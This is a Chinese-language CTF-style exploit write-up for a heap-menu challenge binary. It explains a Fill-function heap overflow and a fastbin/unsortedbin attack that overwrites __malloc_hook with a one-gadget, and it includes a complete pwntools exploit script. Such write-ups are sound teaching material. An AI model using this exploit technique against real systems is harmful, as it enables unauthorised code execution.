# 漏洞利用文档

## 执行环境
基于提供的exp脚本和调试记录分析，程序的执行环境如下：
- **程序类型**：64位ELF二进制文件，使用C/C++编写，模拟堆管理功能。
- **保护机制**（推断自exp成功利用）：
  - 可能启用了ASLR（地址空间布局随机化），但通过堆溢出泄露libc地址被绕过。
  - 可能未启用PIE（位置无关可执行），因为exp中直接使用固定偏移计算地址。
  - 堆保护机制（如堆栈保护）可能未完全生效，允许堆溢出和元数据修改。
- **依赖库**：依赖glibc（从调试记录中libc地址泄露可知），使用标准堆管理函数（如malloc/free）。
- **运行需求**：程序从`/dev/urandom`读取随机数，使用mmap分配内存，需在Linux环境下运行。exp使用pwntools库进行漏洞利用。

## 漏洞成因
### 关键结构体
程序使用一个简单的堆块管理结构体（24字节）：
```c
struct chunk {
    int in_use;        // 是否正在使用（4字节）
    size_t size;       // 块大小（8字节）
    void *data;        // 数据指针（8字节）
};
```
结构体数组存储在固定内存区域（如`0x11854891e3d0`），最多管理16个堆块。

### 漏洞分析
- **漏洞位置**：`sub_E7F`函数（Fill功能）。
- **漏洞类型**：堆溢出。
- **根本原因**：
  - 在Fill操作中，程序读取用户输入的"Size"值（`v3`），但未检查该值是否小于或等于堆块实际分配的大小（存储在结构体的`size`字段）。
  - 直接调用`sub_11B2`函数写入数据，允许写入超过堆块边界的数据。
  - 攻击者可通过指定大于实际大小的Size值，覆盖相邻堆块的元数据（如prev_size、size字段）或数据指针，实现内存破坏。

### 利用后果
- 覆盖堆元数据（如size字段），可伪造chunk大小，操纵堆分配器行为。
- 通过精心构造的溢出，可实现任意地址读写、控制流劫持（如覆盖malloc_hook），最终执行任意代码。

## 漏洞利用过程
利用过程通过堆溢出修改fastbin和unsortedbin元数据，泄露libc地址，并覆盖malloc_hook执行shellcode。以下表格总结了关键步骤的堆内存变化：

| 步骤 | 操作 | 堆内存关键变化 | 利用目的 |
|------|------|----------------|----------|
| 1 | `alloc(0x10);alloc(0x10);alloc(0x30);alloc(0x40);alloc(0x60)` | 初始堆布局：分配5个堆块（大小0x10,0x10,0x30,0x40,0x60），结构体数组初始化。 | 创建可控堆布局，为溢出准备目标。 |
| 2 | `fill(0, p64(0x51)*4); fill(2, p64(0x31)*6)` | 索引0溢出：覆盖索引1的prev_size为0x51，size为0x51；索引2填充在边界内。 | 触发堆溢出，伪造索引1的chunk大小。 |
| 3 | `free(1)` | 索引1释放：因size被伪造为0x51，错误进入fastbin的0x50桶（而非正确0x20桶）。 | 利用伪造size污染fastbin，为UAF做准备。 |
| 4 | `alloc(0x40)` | 重新分配：获取索引1的chunk，但size在结构体中记录为0x40，实际堆元数据为0x51。 | 创建重叠chunk，控制后续内存布局。 |
| 5 | `fill(1, p64(0x91)*4)` | 索引1填充：覆盖堆元数据为0x91，影响相邻chunk。 | 进一步修改元数据，为unsortedbin泄露做准备。 |
| 6 | `free(2)` | 索引2释放：进入unsortedbin，其fd/bk指针指向libc的main_arena。 | 建立unsortedbin链，用于泄露libc地址。 |
| 7 | `dump(1)` | 转储索引1：读取unsortedbin的fd指针（SBaddr），计算malloc_hook地址（SBaddr-88-0x10）。 | 泄露libc基址，计算关键hook地址。 |
| 8 | `free(4)` | 索引4释放：进入fastbin的0x70桶。 | 准备fastbin攻击链。 |
| 9 | `fill(3, payload)` | 索引3填充：构造payload（p64(0)*9 + p64(0x71) + p64(malloc_hook-0x23)），在堆中伪造fastbin链。 | 伪造chunk指向malloc_hook附近，为分配到hook区域做准备。 |
| 10 | `alloc(0x60); alloc(0x60)` | 两次分配：第一次获取正常chunk，第二次从伪造fastbin获取chunk到malloc_hook区域。 | 触发fastbin攻击，控制malloc_hook相邻内存。 |
| 11 | `fill(4, shllcode)` | 索引4填充：写入shellcode（b'a'*0x13 + p64(libc_addr+0x4527a)），覆盖malloc_hook为one-gadget地址。 | 劫持malloc_hook，指向shellcode。 |
| 12 | `alloc(1)` | 触发分配：调用malloc(1)执行malloc_hook中的one-gadget，启动bash。 | 获得shell权限。 |
| 13 | `p.interactive()` | 交互模式：用户可执行任意命令。 | 利用完成，系统被控制。 |

### 内存变化特点
- **堆布局**：通过溢出伪造chunk大小，导致fastbin和unsortedbin元数据不一致。
- **libc泄露**：利用unsortedbin的fd指针泄露main_arena地址，计算libc基址。
- **控制流劫持**：覆盖malloc_hook为one-gadget，在malloc调用时执行任意代码。

## Exploit
以下是漏洞利用脚本（exp），在关键位置添加了注释解释利用逻辑：

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample7')
elf = ELF('./data/sample7')
libc = elf.libc

def alloc(size):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.sendline(str(size).encode())

def fill(idx, payload):
    p.recvuntil(b'Command: ')
    p.sendline(b'2') 
    p.sendline(str(idx).encode())
    p.sendline(str(len(payload)).encode())  # 漏洞点：未检查大小是否合法
    p.send(payload)

def free(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    p.sendline(str(idx).encode())

def dump(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Content: \n')

# Step 1: 分配初始堆块，创建内存布局
alloc(0x10);alloc(0x10);alloc(0x30);alloc(0x40);alloc(0x60)

# Step 2: 触发堆溢出，伪造相邻chunk大小
fill(0, p64(0x51)*4)  # 溢出索引0，覆盖索引1的size为0x51
fill(2, p64(0x31)*6)  # 正常填充索引2

# Step 3: 释放索引1，利用伪造size进入错误fastbin
free(1)

# Step 4: 重新分配，获取重叠内存
alloc(0x40)

# Step 5: 填充索引1，进一步修改元数据
fill(1, p64(0x91)*4)

# Step 6: 释放索引2，使其进入unsortedbin用于泄露libc
free(2)

# Step 7: 转储索引1内容，泄露libc地址并计算malloc_hook
dump(1)
p.recv(0x20)
SBaddr = u64(p.recv(8))  # 获取unsortedbin的fd指针
p.recvline()
malloc_hook = SBaddr - 88 - 0x10  # 计算malloc_hook地址（基于libc偏移）

# Step 8: 释放索引4，准备fastbin攻击
free(4)

# Step 9: 构造payload，在索引3中伪造fastbin链指向malloc_hook附近
payload = p64(0)*9 + p64(0x71) + p64(malloc_hook - 0x23)  # 伪造chunk大小0x71和fd指针
fill(3, payload)

# Step 10: 分配触发fastbin攻击，第二次分配获取malloc_hook区域控制权
alloc(0x60)
alloc(0x60)

# Step 11: 计算libc基址，覆盖malloc_hook为one-gadget
libc_addr = malloc_hook - libc.symbols['__malloc_hook']  # 计算libc基址
payload = p64(libc_addr + 0x4527a)  # one-gadget地址（偏移0x4527a）
shllcode = b'a'*0x13 + payload  # 填充对齐后覆盖malloc_hook
fill(4, shllcode)

# Step 12: 触发malloc_hook执行shellcode
alloc(1)  # 调用malloc(1)触发hook
p.sendline(b'bash')  # 启动bash shell

# Step 13: 进入交互模式
p.interactive()
```

### 注释说明
- **关键函数**：`alloc`、`fill`、`free`、`dump` 对应程序的菜单功能。
- **漏洞利用点**：`fill` 函数中的堆溢出被用于修改堆元数据。
- **地址计算**：通过unsortedbin泄露libc地址，计算malloc_hook和one-gadget偏移。
- **攻击链**：结合fastbin攻击和malloc_hook覆盖，实现代码执行。

此exp成功利用了堆溢出漏洞，在存在ASLR的环境中获取了shell权限。实际运行需确保环境匹配，并根据libc版本调整one-gadget偏移。
